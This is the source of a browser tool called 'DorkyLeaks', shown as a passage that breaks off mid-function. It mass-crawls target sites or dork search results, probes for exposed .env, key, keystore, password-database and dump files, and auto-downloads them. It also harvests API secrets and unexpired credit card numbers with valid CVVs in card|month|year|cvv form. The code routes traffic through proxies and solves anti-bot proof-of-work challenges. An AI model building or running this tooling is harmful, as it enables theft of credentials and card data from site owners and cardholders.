<style>
:root{--bg:#000;--s:#0c0c0c;--b:#1f1f1f;--t:#fff;--d:#8a8a8a;--ok:#22c55e;--bad:#ef4444;--warn:#f59e0b;--r:16px}
*{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
html,body{background:var(--bg)}
body{color:var(--t);font:15px/1.4 -apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,sans-serif;max-width:720px;margin:auto;padding:0 16px calc(32px + env(safe-area-inset-bottom))}
header{position:sticky;top:0;z-index:5;background:rgba(0,0,0,.82);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);padding:calc(14px + env(safe-area-inset-top)) 0 12px;display:flex;justify-content:space-between;align-items:center}
h1{font-size:26px;font-weight:800;letter-spacing:-1.2px}h1 span{color:var(--d)}
.live{font-size:13px;font-weight:600;border:1px solid var(--b);background:var(--s);padding:6px 12px;border-radius:99px;display:flex;align-items:center;gap:7px}
.live i{width:7px;height:7px;border-radius:50%;background:var(--d);display:block}
.live.on i{background:var(--t);animation:p 1s infinite}
.live.ok i{background:var(--ok);animation:none}
.live.bad i{background:var(--bad);animation:none}
@keyframes p{50%{opacity:.2}}
.prog{background:var(--s);border:1px solid var(--b);border-radius:var(--r);padding:14px 16px;margin-bottom:12px;display:none}
.prog.show{display:block}
.prog .row{display:flex;justify-content:space-between;font-size:13px;margin-bottom:10px;gap:10px}
.prog .row span:first-child{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.prog .row span:last-child{color:var(--d);font-variant-numeric:tabular-nums;flex:none}
.prog.paused .fill{background:var(--d)}
.track{height:8px;background:#1a1a1a;border-radius:99px;overflow:hidden}
.fill{height:100%;width:0;background:var(--t);border-radius:99px;transition:width .35s ease}
.progbtns{display:flex;gap:6px;margin-top:10px}
.progbtns .btn{font-size:12px;padding:8px 12px;flex:1}
.seg{display:flex;background:var(--s);border:1px solid var(--b);border-radius:12px;padding:3px;margin-bottom:10px;overflow-x:auto;scrollbar-width:none}
.seg::-webkit-scrollbar{display:none}
.seg button{flex:1;min-width:62px;border:0;background:none;color:var(--d);font:inherit;font-size:12.5px;font-weight:600;padding:9px 0;border-radius:9px;cursor:pointer;white-space:nowrap}
.seg button.on{background:var(--t);color:var(--bg)}
.tab{display:none}.tab.on{display:block}
.field{background:var(--s);border:1px solid var(--b);border-radius:var(--r);padding:12px 14px;margin-bottom:8px}
.field label{display:block;font-size:11.5px;color:var(--d);text-transform:uppercase;letter-spacing:.6px;font-weight:700;margin-bottom:6px}
.field input[type=text],.field input[type=url],.field input[type=number],.field textarea{width:100%;background:none;border:0;color:var(--t);font:inherit;font-size:14px;outline:none;resize:vertical}
.field input[type=number]{-moz-appearance:textfield}.field input[type=number]::-webkit-outer-spin-button,.field input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}
.field textarea{font:12.5px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;min-height:260px;display:block;padding:0}
.tog{display:flex;align-items:center;justify-content:space-between;background:var(--s);border:1px solid var(--b);border-radius:12px;padding:11px 14px;margin-bottom:6px;cursor:pointer;font-size:13.5px;font-weight:500}
.tog input{display:none}
.tog .sw{width:36px;height:20px;background:#262626;border-radius:99px;position:relative;transition:.15s;flex:none}
.tog .sw::after{content:"";position:absolute;top:2px;left:2px;width:16px;height:16px;background:var(--d);border-radius:50%;transition:.15s}
.tog input:checked~.sw{background:var(--t)}
.tog input:checked~.sw::after{transform:translateX(16px);background:var(--bg)}
.tog small{color:var(--d);font-size:11.5px;display:block;margin-top:2px;font-weight:400}
.drop{border:1.5px dashed var(--b);border-radius:var(--r);padding:44px 20px;text-align:center;cursor:pointer;transition:.15s;margin-bottom:12px}
.drop:active,.drop.over{background:var(--s);border-color:var(--t)}
.drop b{display:block;font-size:15px;margin-bottom:4px}
.drop small{color:var(--d);font-size:12.5px}
.btn{border:1px solid var(--b);background:var(--s);color:var(--t);font:inherit;font-size:14px;font-weight:600;padding:11px 16px;border-radius:12px;cursor:pointer;transition:.15s}
.btn.pri{background:var(--t);color:var(--bg);border-color:var(--t)}
.btn:active{transform:scale(.97)}.btn:disabled{opacity:.45;cursor:not-allowed}
.bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
.bar .btn{flex:1;min-width:80px;font-size:13px;padding:10px 12px}
.hint{color:var(--d);font-size:12.5px;margin-bottom:14px;line-height:1.5}
.hint code{background:var(--s);padding:2px 6px;border-radius:5px;font-size:11.5px}
.list{display:flex;flex-direction:column;gap:8px;margin-bottom:12px}
.card{display:flex;align-items:center;gap:12px;background:var(--s);border:1px solid var(--b);border-radius:var(--r);padding:12px 14px;cursor:pointer;transition:.15s}
.card:active{background:#151515}
.card .fl{font-size:22px;width:32px;text-align:center;flex:none}
.card .mid{flex:1;min-width:0}
.card .ad{font:600 14px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;letter-spacing:-.3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.card .sub{color:var(--d);font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
.card .rt{text-align:right;flex:none}
.tag{display:inline-block;font-size:10.5px;font-weight:700;letter-spacing:.6px;text-transform:uppercase;border:1px solid #333;padding:2px 8px;border-radius:99px;color:var(--t)}
.tag.valid{border-color:var(--ok);color:var(--ok)}
.tag.invalid{border-color:var(--bad);color:var(--bad)}
.tag.crit{border-color:var(--t);background:var(--t);color:var(--bg)}
.tag.warn{border-color:var(--warn);color:var(--warn)}
.ms{display:block;color:var(--d);font-size:11.5px;margin-top:3px;font-variant-numeric:tabular-nums}
.empty{text-align:center;color:var(--d);padding:48px 0}
.empty .g{font-size:32px;opacity:.4;margin-bottom:10px}
.log{background:var(--s);border:1px solid var(--b);border-radius:12px;padding:12px 14px;font:11.5px/1.55 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;color:var(--d);max-height:320px;overflow-y:auto;white-space:pre-wrap;word-break:break-word;margin-top:8px}
.log .ok{color:var(--t)}
.log .bad{color:var(--bad)}
.log .warn{color:var(--warn)}
.stat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
.stat{background:var(--s);border:1px solid var(--b);border-radius:12px;padding:12px 14px}
.stat .n{font-size:22px;font-weight:800;letter-spacing:-.5px}
.stat .l{font-size:10.5px;color:var(--d);text-transform:uppercase;letter-spacing:.6px;margin-top:2px;font-weight:700}
.group{margin-bottom:16px}

.toast{position:fixed;left:50%;bottom:calc(24px + env(safe-area-inset-bottom));transform:translate(-50%,20px);background:var(--t);color:var(--bg);font-weight:600;font-size:13px;padding:10px 18px;border-radius:99px;opacity:0;transition:.25s;pointer-events:none;z-index:10;max-width:90vw;text-align:center}

.spin{display:inline-block;width:12px;height:12px;border:2px solid currentColor;border-right-color:transparent;border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}

<header>
  <h1>DorkyLeaks<span></span></h1>
  <div class="live" id="live"><i></i><span id="liveTxt">idle</span></div>
</header>

<div class="prog" id="prog">
  <div class="row"><span id="ptxt">Idle</span><span id="ppct">0%</span></div>
  <div class="track"><div class="fill" id="fill"></div></div>
  <div class="progbtns">
    <button class="btn" id="pauseBtn" disabled>Pause</button>
    <button class="btn" id="stopBtn" disabled>Stop</button>
  </div>
</div>

<div class="seg" id="seg">
  <button class="on" data-tab="crawl">Crawl</button>
  <button data-tab="dork">Dork</button>
  <button data-tab="files">Files</button>
  <button data-tab="paths">Paths</button>
  <button data-tab="results">Results</button>
</div>

<section class="tab on" id="tab-crawl">
  <div class="field"><label>Target URL</label><input type="url" id="crawlUrl" placeholder="https://example.com" autocomplete="off" inputmode="url"></div>
  <label class="tog">Follow same-origin links<input type="checkbox" id="optCrawl" checked><span class="sw"></span></label>
  <label class="tog">Probe path wordlist<input type="checkbox" id="optProbe" checked><span class="sw"></span></label>
  <label class="tog">Auto-download matching files<input type="checkbox" id="optDl" checked><span class="sw"></span></label>
  <label class="tog">Skip context patterns on HTML<small>fewer false positives — only prefix-anchored rules run</small><input type="checkbox" id="optStrict" checked><span class="sw"></span></label>
  <div class="bar" style="margin-top:12px"><button class="btn pri" id="crawlGo">Start crawl</button></div>
  <div class="log" id="crawlLog">ready.</div>
</section>

<section class="tab" id="tab-dork">
  <div class="field"><label>PublicWWW query</label><input type="text" id="dorkQ" placeholder='e.g. "sk_live_" filetype:env' autocomplete="off"></div>
  <div class="field"><label>Max URLs</label><input type="number" id="dorkMax" value="100" min="1" max="5000"></div>
  <label class="tog">Crawl each result<input type="checkbox" id="dorkCrawl" checked><span class="sw"></span></label>
  <label class="tog">Probe paths on each<input type="checkbox" id="dorkProbe" checked><span class="sw"></span></label>
  <label class="tog">Skip context patterns on HTML<small>fewer false positives — only prefix-anchored rules run</small><input type="checkbox" id="optStrict2" checked><span class="sw"></span></label>
  <div class="bar" style="margin-top:12px"><button class="btn pri" id="dorkGo">Run dork</button></div>
  <div class="log" id="dorkLog">ready.</div>
</section>

<section class="tab" id="tab-files">
  <div class="drop" id="drop"><b>Drop files here</b><small>or tap to browse — scan happens locally</small></div>
  <input type="file" id="fileInput" multiple hidden>
  <div class="list" id="fileList"></div>
  <div class="bar"><button class="btn" id="clearFiles">Clear files</button><button class="btn pri" id="scanFiles">Scan</button></div>
</section>

<section class="tab" id="tab-paths">
  <div class="hint">One path per line. <code>#</code> starts a comment. These are prepended to each target's origin during probing.</div>
  <div class="field"><textarea id="pathsEditor" spellcheck="false"></textarea></div>
  <div class="bar"><button class="btn" id="pathsReset">Reset default</button><button class="btn pri" id="pathsSave">Save</button></div>
  <div class="hint" id="pathsCount"></div>
</section>

<section class="tab" id="tab-results">
  <div class="bar"><button class="btn" id="exportJson">Export JSON</button><button class="btn" id="exportTxt">Export TXT</button><button class="btn" id="clearResults">Clear</button></div>
  <div id="resultsBody"><div class="empty"><div class="g">◇</div>No findings yet</div></div>
</section>

<div class="toast" id="toast">copied</div>

<script type="module">
function workerMain() {
  let L;
  const to = (p, ms) => Promise.race([p, new Promise((_, j) => setTimeout(() => j(0), ms))]);
  self._jar = new Map();

  const absorbCookies = sc => {
    if (!sc) return;
    for (const chunk of String(sc).split(/,(?=\s*[A-Za-z0-9_-]+\s*=)/)) {
      const kv = chunk.split(';')[0].trim();
      if (!kv) continue;
      const eq = kv.indexOf('=');
      if (eq > 0) self._jar.set(kv.slice(0, eq), kv.slice(eq + 1));
    }
  };
  const jarHeader = () => [...self._jar.entries()].map(([k, v]) => k + '=' + v).join('; ');

  self.onmessage = async e => {
    const m = e.data;
    if (m.t === 'init') {
      try {
        importScripts(m.lib);
        L = self.libcurl;
        if (!L) throw new Error('libcurl global missing');
        await L.load_wasm();
      } catch (e1) {
        try {
          ({ libcurl: L } = await import(m.libm));
          await L.load_wasm();
        } catch (e2) {
          return postMessage({ t: 'ready', ok: false, why: 'load: ' + ((e1 && e1.message) || e1) + ' | ' + ((e2 && e2.message) || e2) });
        }
      }
      let tried = '';
      for (const w of m.wisp) {
        try {
          L.set_websocket(w);
          await Promise.any(m.probes.map(u =>
            to(L.fetch(u), 12000).then(r => { if (!r || typeof r.status !== 'number') throw 0; })
          ));
          return postMessage({ t: 'ready', ok: true, wisp: w });
        } catch { tried += ' ' + w; }
      }
      postMessage({ t: 'ready', ok: false, why: 'wisp:' + tried });
    } else if (m.t === 'get') {
      try {
        const headers = { ...(m.headers || {}) };
        const jar = jarHeader();
        if (jar && !headers.Cookie) headers.Cookie = jar;
        else if (jar && headers.Cookie) headers.Cookie = headers.Cookie + '; ' + jar;
        if (m.cookie) headers.Cookie = headers.Cookie ? headers.Cookie + '; ' + m.cookie : m.cookie;

        const r = await to(L.fetch(m.url, { headers, redirect: m.redirect || 'follow' }), m.ms || 25000);
        if (!r || typeof r.status !== 'number') {
          return postMessage({ t: 'got', id: m.id, text: '', status: 0, ct: '', setCookie: '' });
        }
        const text = await r.text();
        const h = r.headers && (r.headers.get ? r.headers.get('content-type') : r.headers['content-type']) || '';
        let sc = '';
        if (r.headers && r.headers.get) sc = r.headers.get('set-cookie') || '';
        else if (r.headers) sc = r.headers['set-cookie'] || '';
        absorbCookies(sc);
        postMessage({ t: 'got', id: m.id, text, status: r.status, ct: h, url: m.url, setCookie: sc });
      } catch (e) {
        postMessage({ t: 'got', id: m.id, text: '', status: 0, ct: '', setCookie: '', err: String(e && e.message || e) });
      }
    }
  };
}

/* ==========================================================================
   Patterns — strict:1 = prefix-anchored, runs everywhere. Untagged = context
   or shape-based, skipped on HTML (toggleable).
   ========================================================================== */
const PLACEHOLDERS = ['example','placeholder','changeme','change_me','change-me','your_','your-','my_','my-','insert_','insert-','test_key','test-key','testkey','dummy','sample','sample-','xxxxx','aaaaa','foobar','foo_bar','foo-bar','redacted','fake_','fake-','<your','todo:','fixme'];
const hasPH = s => { const l = s.toLowerCase(); return PLACEHOLDERS.some(t => l.includes(t)); };
const distinct = s => new Set(s).size;

const BAD_VALUES = new Set([
  'undefined','null','true','false','nan','none','test','example',
  'localhost','password','secret','token','apikey','api_key','api-key',
  'your_api_key','your-key','your-key-here','changeme','change_me',
  'yoursecret','yourtoken','placeholder','value','string','number',
  'object','array','function','error','success','failed','active',
  'enabled','disabled','default','production','development','staging',
  'something','anything','whatever','webhook','webhooks','bearer','basic',
  'content-type','application','text/plain','utf-8','gzip','deflate',
  'username','user_name','user-name','account','apikeyhere','secrethere'
]);

function looksLikeGarbage(val) {
  if (!val) return true;
  const trimmed = String(val).trim();
  if (!trimmed) return true;
  if (BAD_VALUES.has(trimmed.toLowerCase())) return true;
  // all same character, or nearly
  if (trimmed.length >= 8 && new Set(trimmed).size <= 2) return true;
  // contains raw whitespace (real secrets don't)
  if (/\s/.test(trimmed)) return true;
  // HTML artifacts
  if (/[<>]/.test(trimmed)) return true;
  // looks like a path fragment, not a secret
  if (/^[./~]/.test(trimmed)) return true;
  // pure hex shorter than 16 chars is never a secret
  if (/^[a-f0-9]{1,15}$/i.test(trimmed)) return true;
  return false;
}

function looksLikeHtml(s) {
  if (!s) return false;
  const head = String(s).slice(0, 2000).toLowerCase();
  return head.includes('<!doctype html') ||
         /<html[\s>]/.test(head) ||
         (head.includes('<head') && head.includes('<script')) ||
         (head.includes('<meta ') && head.includes('<body'));
}

const sha256 = (() => {
  const K = new Uint32Array([
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,

    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
  ]);
  const H0 = new Uint32Array([0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19]);
  const rotr = (x, n) => (x >>> n) | (x << (32 - n));
  const enc = new TextEncoder();
  return function (str) {
    const bytes = enc.encode(str);
    const len = bytes.length, bitLen = len * 8;
    const padded = new Uint8Array((len + 9 + 63) & ~63);
    padded.set(bytes);
    padded[len] = 0x80;
    const view = new DataView(padded.buffer);
    view.setUint32(padded.length - 8, Math.floor(bitLen / 0x100000000));
    view.setUint32(padded.length - 4, bitLen >>> 0);
    const w = new Uint32Array(64);
    const H = new Uint32Array(H0);
    for (let off = 0; off < padded.length; off += 64) {
      for (let i = 0; i < 16; i++) w[i] = view.getUint32(off + i * 4);
      for (let i = 16; i < 64; i++) {
        const s0 = rotr(w[i-15], 7) ^ rotr(w[i-15], 18) ^ (w[i-15] >>> 3);
        const s1 = rotr(w[i-2], 17) ^ rotr(w[i-2], 19) ^ (w[i-2] >>> 10);
        w[i] = (w[i-16] + s0 + w[i-7] + s1) >>> 0;
      }
      let a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
      for (let i = 0; i < 64; i++) {
        const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
        const ch = (e & f) ^ (~e & g);
        const t1 = (h + S1 + ch + K[i] + w[i]) >>> 0;
        const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
        const maj = (a & b) ^ (a & c) ^ (b & c);
        const t2 = (S0 + maj) >>> 0;
        h = g; g = f; f = e; e = (d + t1) >>> 0;
        d = c; c = b; b = a; a = (t1 + t2) >>> 0;
      }
      H[0] = (H[0] + a) >>> 0; H[1] = (H[1] + b) >>> 0; H[2] = (H[2] + c) >>> 0; H[3] = (H[3] + d) >>> 0;
      H[4] = (H[4] + e) >>> 0; H[5] = (H[5] + f) >>> 0; H[6] = (H[6] + g) >>> 0; H[7] = (H[7] + h) >>> 0;
    }
    let hex = '';
    for (let i = 0; i < 8; i++) hex += H[i].toString(16).padStart(8, '0');
    return hex;
  };
})();

function zbits(hex) {
  let n = 0;
  for (const c of hex) {
    const v = parseInt(c, 16);
    if (v === 0) { n += 4; continue; }
    if (v < 2) n += 3; else if (v < 4) n += 2; else if (v < 8) n += 1;
    break;
  }
  return n;
}

function solvePoW(html) {
  const t = html.match(/var\s+task\s*=\s*["']([^"']+)["']\s*;/);
  const n = html.match(/var\s+need\s*=\s*(\d+)\s*;/);
  if (!t || !n) return null;
  const task = t[1];
  const need = parseInt(n[1], 10);
  const t0 = performance.now();
  for (let i = 0; i < 100_000_000; i++) {
    const nonce = i.toString(36);
    if (zbits(sha256(task + nonce)) >= need) {
      return { token: task + '|' + nonce, tries: i, ms: performance.now() - t0 };
    }
  }
  return null;
}

const $ = id => document.getElementById(id);

const esc = s => String(s ?? '').replace(/[&<>"']/g, c => '&#' + c.charCodeAt(0) + ';');
const humanSize = n => n < 1024 ? n + ' B' : n < 1048576 ? (n / 1024).toFixed(1) + ' KB' : (n / 1048576).toFixed(1) + ' MB';
const rot = (a, k) => a.map((_, j) => a[(j + k) % a.length]);

function kill(w) {
  w.dead = true;
  try { w.terminate(); } catch {}
  for (const [id, p] of pending) if (p.w === w) { pending.delete(id); clearTimeout(p.t); p.res(null); }
}

function call(w, msg, ms) {
  if (w.dead) return Promise.resolve(null);
  return new Promise(res => {
    const id = ++jid;
    const t = setTimeout(() => { pending.delete(id); res(null); }, ms);
    pending.set(id, { w, t, res: m => { clearTimeout(t); res(m); } });
    try { w.postMessage({ ...msg, id }); }
    catch { pending.delete(id); clearTimeout(t); res(null); }
  });
}

function spawn(wisp) {
  pool = pool.filter(w => !w.dead);
  return new Promise(res => {
    WURL ||= URL.createObjectURL(new Blob(['(' + workerMain + ')()'], { type: 'text/javascript' }));
    let w;
    let done = false;
    const finish = val => { if (!done) { done = true; clearTimeout(t); res(val); } };
    const t = setTimeout(() => { if (w) { w.ok = false; w.why = 'worker: timeout'; } finish(w || { ok: false, why: 'worker: timeout' }); }, 45000);
    try { w = new Worker(WURL); } catch (e) { return finish({ ok: false, why: 'worker: ' + e.message }); }
    Object.assign(w, { ok: false, dead: false });
    pool.push(w);
    w.onmessage = e => {
      const m = e.data;
      if (m.t === 'ready') { w.ok = m.ok; w.why = m.why; w.wisp = m.wisp; finish(w); }
      else { const f = pending.get(m.id); if (f) { pending.delete(m.id); f.res(m); } }
    };
    w.onerror = e => { w.ok = false; w.why = 'load: ' + (e.message || 'worker error'); finish(w); };
    w.postMessage({ t: 'init', lib: LIBCURL, libm: LIBCURL_M, wisp, probes: PROBES });
  });
}

async function startPool() {
  pool.forEach(kill); pool = [];
  let saved = '';
  try { saved = localStorage.getItem('DorkyLeaks_wisp') || ''; } catch {}
  const wl = [...new Set([...WISP, saved].filter(Boolean))];
  if (!wl.length) { setLive('bad', 'no wisp'); return { ok: false, why: 'no wisp servers configured' }; }
  setLive('on', 'connecting');
  const first = await spawn(wl);
  if (!first.ok) {
    setLive('bad', 'wisp failed');
    return { ok: false, why: first.why || 'worker failed' };
  }
  try { localStorage.setItem('DorkyLeaks_wisp', first.wisp); } catch {}
  logTo('crawlLog', '[+] wisp ok: ' + first.wisp, 'ok');
  logTo('dorkLog', '[+] wisp ok: ' + first.wisp, 'ok');
  await Promise.all(Array.from({ length: WORKERS - 1 }, (_, k) => spawn(rot(wl, k + 1))));
  poolReady = true;
  setLive('ok', 'ready');
  return { ok: true };
}

async function httpFetch(url, opts = {}) {
  const live = pool.filter(w => w.ok && !w.dead);
  if (!live.length) throw new Error('no live workers');
  const w = opts.worker || live[rr++ % live.length];
  const m = await call(w, {
    t: 'get', url,
    headers: opts.headers,
    ms: opts.ms || 25000,
    redirect: opts.redirect,
    cookie: opts.cookie,
  }, (opts.ms || 25000) + 5000);
  if (!m || m.text === undefined) throw new Error('fetch failed');
  return {
    status: m.status || 0,
    text: m.text || '',
    headers: { 'content-type': m.ct || '', 'set-cookie': m.setCookie || '' },
    url: m.url || url,
  };
}

const state = { findings: [], seen: new Set(), downloads: [], files: [] };
let PATHS = [];

function addFinding(type, value, source, status) {
  const k = type + '|' + value + '|' + source;
  if (state.seen.has(k)) return false;
  state.seen.add(k);
  state.findings.push({ type, value, source: source || '', status: status || 'FORMAT_VALID' });
  return true;
}

function scanContent(content, source, opts = {}) {
  const { strict = false } = opts;
  const out = [];
  if (!content) return out;
  for (const rule of RULES) {
    if (strict && !rule.strict) continue;
    const re = new RegExp(rule.r.source, rule.r.flags);
    let m;
    while ((m = re.exec(content)) !== null) {
      let val;
      if (rule.groups) val = rule.groups.map(i => m[i] || '').join('');
      else val = m[1] || m[0];
      if (!val) continue;
      if (looksLikeGarbage(val)) continue;
      if (rule.minLen && val.length < rule.minLen) continue;
      if (rule.minDistinct && distinct(val) < rule.minDistinct) continue;
      if (rule.requireChars && !rule.requireChars.some(c => val.includes(c))) continue;
      if (rule.requireSub && !rule.requireSub.every(s => val.includes(s))) continue;
      if (rule.notStart && rule.notStart.some(s => val.startsWith(s))) continue;
      if (rule.notEnd && rule.notEnd.some(s => val.endsWith(s))) continue;
      if (rule.blacklist && rule.blacklist.includes(val.toLowerCase())) continue;
      if (hasPH(val)) continue;
      out.push({ type: rule.n, value: val, source: source || '', status: 'FORMAT_VALID', v: rule.v });
    }
  }
  for (const c of CARDS) {
    const re = new RegExp(c.r.source, c.r.flags);
    let m;
    while ((m = re.exec(content)) !== null) {
      try {
        let cn, mo, yr, cvv;
        if (c.c) { cn = c.c.map(g => m[g]).join(''); mo = m[c.o[0]]; yr = m[c.o[1]]; cvv = m[c.o[2]]; }
        else { cn = m[c.o[0]]; mo = m[c.o[1]]; yr = m[c.o[2]]; cvv = m[c.o[3]]; }
        if (!luhn(cn)) continue;
        if (!/^\d{3,4}$/.test(cvv)) continue;
        const mm = parseInt(mo, 10);
        if (mm < 1 || mm > 12) continue;
        const yy = yr.length === 2 ? parseInt('20' + yr, 10) : parseInt(yr, 10);
        const now = new Date();
        if (new Date(yy, mm - 1, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) continue;
        out.push({ type: 'Credit Card', value: `${cn}|${String(mm).padStart(2,'0')}|${String(yy).slice(-2)}|${cvv}`, source: source || '', status: 'FORMAT_VALID' });
      } catch {}
    }
  }
  return out;
}

function luhn(c) {
  if (!/^\d{13,19}$/.test(c)) return false;
  const d = c.split('').map(Number); let s = 0;
  for (let i = 0; i < d.length; i++) {
    let x = d[i];
    if ((d.length - 1 - i) % 2 === 1) { x *= 2; if (x > 9) x -= 9; }
    s += x;
  }
  return s % 10 === 0;
}

function extractLinks(html, base) {
  const out = new Set();
  try {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    doc.querySelectorAll('a[href],script[src],link[href],iframe[src],img[src],form[action]').forEach(el => {
      const href = el.getAttribute('href') || el.getAttribute('src') || el.getAttribute('action');
      if (!href) return;
      try { out.add(new URL(href, base).href.split('#')[0]); } catch {}
    });
  } catch {}
  return [...out];
}

function shouldSave(url, ct) {
  ct = (ct || '').split(';')[0].trim().toLowerCase();
  if (ct === 'text/html' || ct === 'application/xhtml+xml') return false;
  const okCt = ['application/pdf','application/zip','application/x-tar','application/gzip','application/octet-stream','application/x-7z-compressed','application/x-rar-compressed','application/x-sqlite3','application/x-sql','application/sql','application/x-httpd-php','application/x-sh','application/x-python','application/msword','application/vnd.ms-excel','application/x-pkcs12','application/x-pem-file','application/pkix-cert','application/x-java-keystore','application/x-msdownload'];
  if (okCt.some(p => ct.startsWith(p))) return true;
  const ext = url.split('?')[0].split('.').pop().toLowerCase();
  const okExt = ['env','sql','bak','backup','zip','tar','gz','tgz','7z','rar','pdf','csv','xml','json','yml','yaml','toml','ini','conf','cfg','pem','key','crt','cer','p12','pfx','jks','keystore','log','txt','properties','tfstate','tfvars','tf','hcl','db','sqlite','sqlite3','dump','ppk','ovpn','rdp','kdbx','sh','py','rb','js','ts','php','pl','ps1','bat','htpasswd','npmrc','pypirc','netrc','pgpass'];
  return okExt.includes(ext);
}

function downloadBlob(name, content) {
  try {
    const blob = new Blob([content]);
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = name;
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 100);
    state.downloads.push({ name, size: content.length || content.byteLength || 0 });
  } catch {}
}

let abortFlag = false, pausedFlag = false, resumeWaiters = [];
const waitResume = () => pausedFlag ? new Promise(r => resumeWaiters.push(r)) : Promise.resolve();
function setPaused(p) {
  pausedFlag = p;
  $('prog').classList.toggle('paused', p);
  $('pauseBtn').textContent = p ? 'Resume' : 'Pause';
  if (!p) { const w = resumeWaiters; resumeWaiters = []; w.forEach(fn => fn()); }
}

async function crawlSite(base, opts) {
  const { doCrawl = true, doProbe = true, doDl = true, logId = 'crawlLog', skipLoose = true } = opts || {};
  const log = (m, c) => logTo(logId, m, c);

  let domain, origin;
  try { const u = new URL(base); domain = u.hostname; origin = u.protocol + '//' + u.host; }
  catch { log('[x] invalid url: ' + base, 'bad'); return { files: 0, hits: 0, probed: 0 }; }

  const visited = new Set();
  const queue = [base];
  if (doProbe) for (const p of HIGH_VALUE) queue.push(origin + (p.startsWith('/') ? p : '/' + p));
  let savedFiles = 0, hitPaths = 0, probedPaths = 0;

  log('→ ' + base, 'ok');

  while (queue.length && visited.size < CRAWL_MAX && !abortFlag) {
    if (pausedFlag) { await waitResume(); continue; }
    const batch = [];
    while (queue.length && batch.length < CRAWL_CONC && visited.size + batch.length < CRAWL_MAX) {
      const u = queue.shift();
      const norm = u.split('#')[0].split('?')[0].replace(/\/$/, '');
      if (visited.has(norm)) continue;
      visited.add(norm);
      batch.push(u);
    }
    if (!batch.length) break;
    const results = await Promise.allSettled(batch.map(u => httpFetch(u)));
    for (let i = 0; i < results.length; i++) {
      const r = results[i], u = batch[i];
      if (r.status !== 'fulfilled') continue;
      const res = r.value;
      if (res.status >= 400) continue;
      const ct = res.headers['content-type'] || '';
      const isHtml = /html/i.test(ct) || looksLikeHtml(res.text);
      const isText = /text|json|xml|javascript|yaml/i.test(ct) || (!ct && res.text.length < 500000);
      if (isText) {
        const found = scanContent(res.text, u, { strict: skipLoose && isHtml });
        for (const f of found) {
          if (addFinding(f.type, f.value, u, f.status)) log('★ ' + f.type + ' → ' + u, 'ok');
        }
      }
      if (doDl && shouldSave(u, ct) && res.text.length < MAX_FILE) {
        const safe = (new URL(u).hostname + new URL(u).pathname).replace(/[^a-z0-9._/-]/gi, '_');
        downloadBlob(safe, res.text);
        savedFiles++;
        log('▼ ' + u + ' (' + humanSize(res.text.length) + ')', 'ok');
      }
      if (doCrawl && /html/i.test(ct)) {
        for (const l of extractLinks(res.text, u)) {
          try {
            if (new URL(l).hostname === domain) {
              const norm = l.split('#')[0].split('?')[0].replace(/\/$/, '');
              if (!visited.has(norm)) queue.push(l);
            }
          } catch {}
        }
      }
    }
    updateProgress(Math.min(100, (visited.size / CRAWL_MAX) * 100), `crawl ${visited.size}/${CRAWL_MAX} · ${state.findings.length} findings`);
    await sleep(15);
  }

  if (doProbe && !abortFlag && PATHS.length) {
    log('probing ' + PATHS.length + ' paths…', 'ok');
    const targets = [];
    for (const p of PATHS) {
      const path = p.startsWith('/') ? p : '/' + p;
      const u = origin + path;
      const norm = u.split('#')[0].split('?')[0].replace(/\/$/, '');
      if (visited.has(norm)) continue;
      visited.add(norm);
      targets.push(u);
    }
    targets.sort((a, b) => {
      const ah = HIGH_VALUE.some(h => a.includes(h)) ? 1 : 0;
      const bh = HIGH_VALUE.some(h => b.includes(h)) ? 1 : 0;
      return bh - ah;
    });
    let idx = 0;
    const worker = async () => {
      while (idx < targets.length && !abortFlag) {
        if (pausedFlag) { await waitResume(); continue; }
        const u = targets[idx++];
        probedPaths++;
        try {
          const res = await httpFetch(u, { redirect: 'manual' });
          if ([200,201,203,206,301,302,307,308,401,403].includes(res.status)) {
            hitPaths++;
            const ct = res.headers['content-type'] || '';
            const isHtml = /html/i.test(ct) || looksLikeHtml(res.text);
            const isText = /text|json|xml|javascript|yaml/i.test(ct);
            if (isText) {
              const found = scanContent(res.text, u, { strict: skipLoose && isHtml });
              for (const f of found) {
                if (addFinding(f.type, f.value, u, f.status)) log('★ ' + f.type + ' → ' + u, 'ok');
              }
            }
            if (doDl && shouldSave(u, ct)) {
              const safe = (new URL(u).hostname + new URL(u).pathname).replace(/[^a-z0-9._/-]/gi, '_');
